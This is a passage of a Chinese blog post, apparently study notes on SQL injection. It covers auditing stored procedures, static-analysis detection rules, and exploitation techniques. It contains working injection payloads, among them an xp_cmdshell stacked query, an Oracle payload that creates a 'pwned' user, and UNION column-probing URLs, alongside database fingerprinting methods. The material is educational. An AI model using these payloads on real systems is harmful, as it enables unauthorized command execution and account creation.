keyword\">declare</span> <span class=\"token variable\">@sql</span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">250</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">-- create the find like command</span>\n<span class=\"token keyword\">select</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">'select '''</span> <span class=\"token operator\">+</span> <span class=\"token variable\">@dbname</span> <span class=\"token operator\">+</span> <span class=\"token string\">''' as db, o.name,m.definition'</span>\n<span class=\"token keyword\">select</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">+</span> <span class=\"token string\">'from '</span><span class=\"token operator\">+</span><span class=\"token variable\">@dbname</span><span class=\"token operator\">+</span><span class=\"token string\">'.sys.sql_modules m '</span> \n<span class=\"token keyword\">select</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">+</span> <span class=\"token string\">'inner join '</span><span class=\"token operator\">+</span><span class=\"token variable\">@dbname</span><span class=\"token operator\">+</span><span class=\"token string\">'...sysobjects o on\nm.object_id=o.id'</span>\n<span class=\"token keyword\">select</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">@sql</span> <span class=\"token operator\">+</span> <span class=\"token string\">'where [definition] like ''%'</span><span class=\"token operator\">+</span><span class=\"token variable\">@text</span><span class=\"token operator\">+</span><span class=\"token string\">'%'''</span> \n<span class=\"token keyword\">execute</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">@sql</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">end</span>\n<span class=\"token keyword\">END</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>调用储存过程</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">execute</span> grep_sp <span class=\"token string\">'sp_executesql'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">execute</span> grep_sp <span class=\"token string\">'EXEC'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>列出SQL Server 2008数据库中所有的存储过程</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> name <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span>procedures <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> name <span class=\"token keyword\">asc</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>脚本</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@name</span> <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- database name</span>\n<span class=\"token keyword\">DECLARE</span> db_cursor <span class=\"token keyword\">CURSOR</span> <span class=\"token keyword\">FOR</span>\n<span class=\"token keyword\">SELECT</span> name <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span>procedures<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">OPEN</span> db_cursor\n<span class=\"token keyword\">FETCH</span> <span class=\"token keyword\">NEXT</span> <span class=\"token keyword\">FROM</span> db_cursor <span class=\"token keyword\">INTO</span> <span class=\"token variable\">@name</span>\n<span class=\"token keyword\">WHILE</span> @<span class=\"token variable\">@FETCH_STATUS</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">BEGIN</span>\n<span class=\"token keyword\">print</span> <span class=\"token variable\">@name</span>\n<span class=\"token comment\">-- uncomment the line below to print the source</span>\n<span class=\"token comment\">-- sp_helptext '' + @name + ''</span>\n<span class=\"token keyword\">FETCH</span> <span class=\"token keyword\">NEXT</span> <span class=\"token keyword\">FROM</span> db_cursor <span class=\"token keyword\">INTO</span> <span class=\"token variable\">@name</span>\n<span class=\"token keyword\">END</span>\n<span class=\"token keyword\">CLOSE</span> db_cursor\n<span class=\"token keyword\">DEALLOCATE</span> db_cursor<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>mysql获取储存过程</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">show</span> <span class=\"token keyword\">procedure</span> <span class=\"token keyword\">status</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#列出一系列储存过程</span>\n<span class=\"token keyword\">show</span> <span class=\"token keyword\">create</span> <span class=\"token keyword\">procedure</span> sp_name<span class=\"token punctuation\">;</span><span class=\"token comment\">#列出sp_name的源代码</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"自动复查源代码\"><a href=\"#自动复查源代码\" class=\"headerlink\" title=\"自动复查源代码\"></a>自动复查源代码</h3><h4 id=\"Graudit\"><a href=\"#Graudit\" class=\"headerlink\" title=\"Graudit\"></a>Graudit</h4><p>下载： <a href=\"http://www.justanotherhacker.com/projects/graudit/\">graudit (justanotherhacker.com)</a></p>\n<p>规则</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">pg_query\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_exec\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_send_query\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_send_query_params\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_query_params\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_send_prepare\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_prepare\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_execute\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_insert\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_put_line\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_select\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span>\npg_update\\s<span class=\"token operator\">*</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\$<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>\\<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"YASCA\"><a href=\"#YASCA\" class=\"headerlink\" title=\"YASCA\"></a>YASCA</h4><h4 id=\"Pixy\"><a href=\"#Pixy\" class=\"headerlink\" title=\"Pixy\"></a>Pixy</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">mysql_db_query <span class=\"token keyword\">SQL</span> injection configuration <span class=\"token keyword\">file</span> <span class=\"token keyword\">for</span> <span class=\"token keyword\">user</span><span class=\"token operator\">-</span>defined sink sinkType <span class=\"token operator\">=</span> <span class=\"token keyword\">sql</span>\nmysql_db_query <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"AppCodeScan\"><a href=\"#AppCodeScan\" class=\"headerlink\" title=\"AppCodeScan\"></a>AppCodeScan</h4><p>.NET</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#Scanning for SQL injections</span>\n<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>SqlCommand<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>?<span class=\"token operator\">|</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>DbCommand<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>?<span class=\"token operator\">|</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>OleDbCommand<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>?<span class=\"token operator\">|</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>SqlUtility<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>?<span class=\"token operator\">|</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>OdbcCommand<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>?<span class=\"token operator\">|</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>OleDbDataAdapter<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>?<span class=\"token operator\">|</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>SqlDataSource<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>?<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"OWASP-LAPSE-项目\"><a href=\"#OWASP-LAPSE-项目\" class=\"headerlink\" title=\"OWASP LAPSE+项目\"></a>OWASP LAPSE+项目</h4><h4 id=\"Microsoft-SQL注入源代码分析器\"><a href=\"#Microsoft-SQL注入源代码分析器\" class=\"headerlink\" title=\"Microsoft SQL注入源代码分析器\"></a>Microsoft SQL注入源代码分析器</h4><h4 id=\"CAT-NET\"><a href=\"#CAT-NET\" class=\"headerlink\" title=\"CAT.NET\"></a>CAT.NET</h4><h4 id=\"RIPS——PHP脚本漏洞的静态源代码分析器\"><a href=\"#RIPS——PHP脚本漏洞的静态源代码分析器\" class=\"headerlink\" title=\"RIPS——PHP脚本漏洞的静态源代码分析器\"></a>RIPS——PHP脚本漏洞的静态源代码分析器</h4><h4 id=\"CodePro-AnalytiX\"><a href=\"#CodePro-AnalytiX\" class=\"headerlink\" title=\"CodePro AnalytiX\"></a>CodePro AnalytiX</h4><h4 id=\"Teachable-Static-Analysis-Workbench\"><a href=\"#Teachable-Static-Analysis-Workbench\" class=\"headerlink\" title=\"Teachable Static Analysis Workbench\"></a>Teachable Static Analysis Workbench</h4><h4 id=\"商业源代码复查工具\"><a href=\"#商业源代码复查工具\" class=\"headerlink\" title=\"商业源代码复查工具\"></a>商业源代码复查工具</h4><h4 id=\"Fortify源代码分析器\"><a href=\"#Fortify源代码分析器\" class=\"headerlink\" title=\"Fortify源代码分析器\"></a>Fortify源代码分析器</h4><h4 id=\"Rational-AppScan-Source-Edition\"><a href=\"#Rational-AppScan-Source-Edition\" class=\"headerlink\" title=\"Rational AppScan Source Edition\"></a>Rational AppScan Source Edition</h4><h4 id=\"CodeSecure\"><a href=\"#CodeSecure\" class=\"headerlink\" title=\"CodeSecure\"></a>CodeSecure</h4><h4 id=\"Klocwork-Solo\"><a href=\"#Klocwork-Solo\" class=\"headerlink\" title=\"Klocwork Solo\"></a>Klocwork Solo</h4><h2 id=\"利用SQL注入\"><a href=\"#利用SQL注入\" class=\"headerlink\" title=\"利用SQL注入\"></a>利用SQL注入</h2><h3 id=\"常见的漏洞利用技术\"><a href=\"#常见的漏洞利用技术\" class=\"headerlink\" title=\"常见的漏洞利用技术\"></a>常见的漏洞利用技术</h3><p>本章大多用这个示例</p>\n<p><a href=\"http://sql/Less-2/?id=1\">http://sql/Less-2/?id=1</a></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/dd9f49a480d63d71849c61af3a1bb103.png\"></p>\n<h4 id=\"使用堆叠注入\"><a href=\"#使用堆叠注入\" class=\"headerlink\" title=\"使用堆叠注入\"></a>使用堆叠注入</h4><p>堆叠查询（stacked query）指的是在单个数据库连接中执行多个查询序列，使用不同的数据库和不同的web框架，对堆叠查询支持情况也不同，使用ASP.NET和PHP访问Microsoft SQL Server时允许堆叠查询，但如果使用Java来访问，就不允许。使用PHP访问PostgreSQL时， PHP允许堆叠查询，但如果访问MySQL, PHP不允许堆叠查询。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/products.asp=id=l;exec+master..xp_cmdshell+'dir'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"在Web应用程序中利用Oracle漏洞\"><a href=\"#在Web应用程序中利用Oracle漏洞\" class=\"headerlink\" title=\"在Web应用程序中利用Oracle漏洞\"></a>在Web应用程序中利用Oracle漏洞</h4><p>Oracle SQL语法不支持堆叠查询，PL/SQL是内置在Oracle中的，它拓展了SQL并允许执行堆叠的命令，使用一个匿名PL/SQL块，它包含在一条BEGIN语句与一条END语句之间，是一个自由编写的PL/SQL块。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SQL</span><span class=\"token operator\">&gt;</span><span class=\"token keyword\">DECLARE</span>\nMESG VARCHAR2 <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">BEGIN</span>\nMESG:<span class=\"token operator\">=</span><span class=\"token string\">'HELLO WORLD'</span><span class=\"token punctuation\">;</span>\nDBMS_OUTPUT<span class=\"token punctuation\">.</span>PUT_LINE<span class=\"token punctuation\">(</span>MESG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Oracle默认安装了两个允许执行匿名PL/SQL块的函数</p>\n<p><code>dbms_xmlquery.newcontext()</code> <code>dbms_xmlquery.getxml()</code></p>\n<p>public用户默认允许访问这两个函数，所以可以使用这两个函数来执行DML/DDL语句块，形成SQL注入</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery.newcontext('declare PRAGMA AUT0N0M0US_TRANSACTI0N; begin execute immediate '' create user pwned identified by pwn3d ''; commit; end;') from dual) is not null -- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"识别数据库\"><a href=\"#识别数据库\" class=\"headerlink\" title=\"识别数据库\"></a>识别数据库</h3><p>ASP和.NET通常使用Microsoft SQL Server 作为后台数据库，而PHP应用则很可能使用MySQL或PostgreSQL。如果应用是用Java编写的，那么使用的可能是Oracle或MySQL。此外，底层操作系统也可以提供一些线索：安装 IIS（Intemet信息服务器）作为服务器平台标志着应用是基于Windows的架构，后台数据库很可能是SQLServer。而运行Apache和PHP的Linux服务器则很可能使用的是开源数据库，比如 MySQL或PostgreSQL。</p>\n<h4 id=\"非盲跟踪\"><a href=\"#非盲跟踪\" class=\"headerlink\" title=\"非盲跟踪\"></a>非盲跟踪</h4><p>查询使用的数据库服务器技术不同，这条SQL产生的错误也会不同，可以根据这些不同判断出数据库类型。</p>\n<p>下面是常见的报错</p>\n<ul>\n<li><p>mssql</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Microsoft OLE DB Provider <span class=\"token keyword\">for</span> ODBC Drivers error <span class=\"token string\">'80040e14'</span>\n<span class=\"token punctuation\">[</span>Microsof<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>ODBC <span class=\"token keyword\">SQL</span> Server Driver<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">SQL</span> Server<span class=\"token punctuation\">]</span>Unclosed quotation mark <span class=\"token keyword\">after</span> the <span class=\"token keyword\">character</span>\nstring\"<span class=\"token punctuation\">.</span>\n<span class=\"token operator\">/</span>products<span class=\"token punctuation\">.</span>asp<span class=\"token punctuation\">,</span>line <span class=\"token number\">33</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>mysql</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">ERROR <span class=\"token number\">1064</span> <span class=\"token punctuation\">(</span><span class=\"token number\">42000</span><span class=\"token punctuation\">)</span> : You have an error <span class=\"token operator\">in</span> your <span class=\"token keyword\">SQL</span> syntax<span class=\"token punctuation\">;</span> <span class=\"token keyword\">check</span> the manual that corresponds <span class=\"token keyword\">to</span> your MySQL server version <span class=\"token keyword\">for</span> the <span class=\"token keyword\">right</span> syntax <span class=\"token keyword\">to</span> <span class=\"token keyword\">use</span>\nnear<span class=\"token string\">' '</span>at line <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n</li>\n<li><p>oracle</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">ORA<span class=\"token operator\">-</span><span class=\"token number\">01773</span>:may <span class=\"token operator\">not</span> specify <span class=\"token keyword\">column</span> datatypes <span class=\"token operator\">in</span> this <span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>postgreSQL</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">pg_query<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>: Query failed: ERROR: unterminated quoted string at <span class=\"token operator\">or</span> near at <span class=\"token keyword\">character</span> <span class=\"token number\">69</span> <span class=\"token operator\">in</span> <span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>php<span class=\"token operator\">/</span>somepge<span class=\"token punctuation\">.</span>php <span class=\"token keyword\">on</span> line <span class=\"token number\">20</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n<h5 id=\"获取标志信息\"><a href=\"#获取标志信息\" class=\"headerlink\" title=\"获取标志信息\"></a>获取标志信息</h5><table>\n<thead>\n<tr>\n<th>数据库服务器</th>\n<th>查询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>MSSQL</td>\n<td>select @@version</td>\n</tr>\n<tr>\n<td>Mysql</td>\n<td>select version()  <br>select @@version</td>\n</tr>\n<tr>\n<td>Oralce</td>\n<td>select banner from v$version<br>select banner from v$version where rownum=1</td>\n</tr>\n<tr>\n<td>PostgreSQL</td>\n<td>select version()</td>\n</tr>\n</tbody></table>\n<ul>\n<li>mssql</li>\n</ul>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/products.asp?id=@@version</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>数据库将传入的@@version当做数字型解析产生报错</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token punctuation\">[</span>Microsoft<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>ODBC <span class=\"token keyword\">SQL</span> Server Driver<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">SQL</span> Server<span class=\"token punctuation\">]</span>Conversion failed <span class=\"token keyword\">when</span> converting the\nnvarchar <span class=\"token keyword\">value</span> <span class=\"token string\">'Microsoft SQL Server 2005-9.00.3042.00 (Intel X86) Feb 9 2007 22:47:07 Copyright (c) 1988-2005 Microsoft Corporation Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)'</span><span class=\"token keyword\">to</span> <span class=\"token keyword\">data</span> <span class=\"token keyword\">type</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span>\n<span class=\"token operator\">/</span>products<span class=\"token punctuation\">.</span>asp<span class=\"token punctuation\">.</span>line <span class=\"token number\">33</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这段错误代码表明了数据库为SQL Server 2005，补丁Service Pack 2</p>\n<ul>\n<li>PostgreSQL</li>\n</ul>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">PostgreSQL <span class=\"token number\">9.1</span><span class=\"token number\">.1</span> <span class=\"token keyword\">on</span> i686<span class=\"token operator\">-</span>pc<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>gnu<span class=\"token punctuation\">,</span> compiled <span class=\"token keyword\">by</span> i686<span class=\"token operator\">-</span>pc<span class=\"token operator\">-</span>linuxgnu<span class=\"token operator\">-</span> gcc <span class=\"token punctuation\">(</span>Gentoo Hardened <span class=\"token number\">4.4</span><span class=\"token number\">.5</span> pl<span class=\"token punctuation\">.</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> pie<span class=\"token operator\">-</span><span class=\"token number\">0.4</span><span class=\"token number\">.5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token operator\">-</span><span class=\"token keyword\">bit</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>同样返回了很多底层的信息</p>\n<p>使用具有标志性的字符串或者语句注入，在返回结果（报错结果）中寻找改字符串或者语句的执行结果，如果找到了，这儿就可以作为注入点。</p>\n<p>SQL Server内置变量</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">@<span class=\"token variable\">@version</span>:数据库服务器版本。\n@<span class=\"token variable\">@servemame</span>:安装<span class=\"token keyword\">SQL</span> Server的服务器名称。\n@<span class=\"token variable\">@language</span>：当前所使用语言的名称。\n@<span class=\"token variable\">@spid</span>：当前用户的进程ID。\n可以使用下列查询获取详细的版本信息：\n<span class=\"token keyword\">SELECT</span> SERVERPROPERTYCproductversion’<span class=\"token punctuation\">)</span>：例如<span class=\"token number\">100.1600</span><span class=\"token number\">.22</span>。 \n<span class=\"token keyword\">SELECT</span> SERVERPROPERTY<span class=\"token punctuation\">(</span><span class=\"token string\">'productlevel'</span><span class=\"token punctuation\">)</span>:例如 RTM。\n<span class=\"token keyword\">SELECT</span> SERVERPROPERTY<span class=\"token punctuation\">(</span><span class=\"token string\">'edition'</span><span class=\"token punctuation\">)</span>:例如 Enterprise。\n<span class=\"token keyword\">EXEC</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>msver：更多详细信息，包括处理器数量、处理器类型、物理内存等。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"盲追踪\"><a href=\"#盲追踪\" class=\"headerlink\" title=\"盲追踪\"></a>盲追踪</h4><p>应用不会返回信息时，利用不同数据库使用SQL语法不同产生的差异来判断数据库类型。</p>\n<h5 id=\"连接字符串的方式\"><a href=\"#连接字符串的方式\" class=\"headerlink\" title=\"连接字符串的方式\"></a>连接字符串的方式</h5><p>用不同的支付串连接方式注入，通过原始请求返回结果对比，若相同，则为对应数据库。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/db5df62ba1c448f7b78f246d43b03ad3.png\"></p>\n<h5 id=\"数字函数\"><a href=\"#数字函数\" class=\"headerlink\" title=\"数字函数\"></a>数字函数</h5><p>相当于不同数据库的特征值，原理和前面相似</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/87b6f9ee5436f469cb58fd426a00d7c1.png\"></p>\n<p>例如，成功注入<code>WAITEOR DELAY</code>，表明数据库是mssql，成功注入<code>select pg_sleep(10)</code>，表明数据库是PostgreSQL</p>\n<p>Mysql精确确定版本</p>\n<p><code>/* !版本号 语句*/</code>若数据库版本号高于或等于！后面的，就会执行语句</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token number\">1</span> <span class=\"token comment\">/* !40119 + 1*/</span>\n<span class=\"token comment\">-- 2（如果MySQL版本为4.01.19或更高版本）</span>\n<span class=\"token comment\">-- 1（其他情况）</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"使用UNION语句提取数据\"><a href=\"#使用UNION语句提取数据\" class=\"headerlink\" title=\"使用UNION语句提取数据\"></a>使用UNION语句提取数据</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">column</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">column</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">column</span><span class=\"token operator\">-</span>N <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">table</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>\n<span class=\"token keyword\">UNION</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">column</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">column</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">column</span><span class=\"token operator\">-</span>N <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">table</span><span class=\"token operator\">-</span><span class=\"token number\">2</span>\n<span class=\"token comment\">-- 去除重复值</span>\n<span class=\"token keyword\">UNION</span> <span class=\"token keyword\">ALL</span><span class=\"token comment\">-- 重复的也显示</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>返回有这两张表或者两个查询得到的数据</p>\n<h4 id=\"匹配列\"><a href=\"#匹配列\" class=\"headerlink\" title=\"匹配列\"></a>匹配列</h4><p>满足要求</p>\n<ul>\n<li>两个查询的列数必须相同</li>\n<li>两个select对应列返回的数据类型是兼容的</li>\n</ul>\n<p>如果无法满足这两个条件就会查询失败并返回一个错误，下面是一些数据库返回的错误</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/e78b0ba30b6e81959a8c7d560b34f51b.png\"></p>\n<p>要得到正确的列数，两种方法</p>\n<ul>\n<li><p>每次增加列数，不断尝试</p>\n<p>NULL值会转化为其他任何数据类型，这样能避免因数据类型不同而产生错误。</p>\n<p>mysql</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12+union+select+null-- </span>\nhttp:<span class=\"token comment\">//test/?id=12+union+select+null,null-- </span>\nhttp:<span class=\"token comment\">//test/?id=12+union+select+null,null,null-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>oracle要求每个select必须带from，使用dual（所用用户都能访问）表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?id=12+union+select+null+from+dual-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>使用order by字句</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span 